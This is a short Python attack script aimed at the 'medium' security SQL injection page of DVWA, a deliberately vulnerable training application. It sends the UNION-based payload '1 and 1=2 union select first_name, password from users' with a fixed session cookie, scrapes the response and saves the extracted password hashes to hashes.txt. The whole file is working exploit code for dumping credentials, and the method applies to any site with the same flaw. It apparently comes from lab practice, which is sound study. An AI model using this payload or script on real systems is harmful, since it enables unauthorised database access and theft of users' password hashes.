import requests
import urllib.parse
import argparse
from bs4 import BeautifulSoup

parser  = argparse.ArgumentParser()
parser.add_argument('target_ip')
args    = parser.parse_args()

target_ip   = args.target_ip

cookies ={
    'PHPSESSID': 'c477209fa2de651352e71c3c44f96999',
    'security': 'medium',
}

payload = "1 and 1=2 union select first_name, password from users"
payload = urllib.parse.quote(payload)

req = requests.get('http://' + target_ip + '/dvwa/vulnerabilities/sqli_blind/?id=' + payload + '&Submit=Submit#', cookies=cookies)

soup    = BeautifulSoup(req.text, 'html.parser')
pres    = soup.select('pre')

with open("hashes.txt", "w") as hashes_file:
    for pre in pres:
        hashes_file.write(pre.getText()[-32:] + '\n')
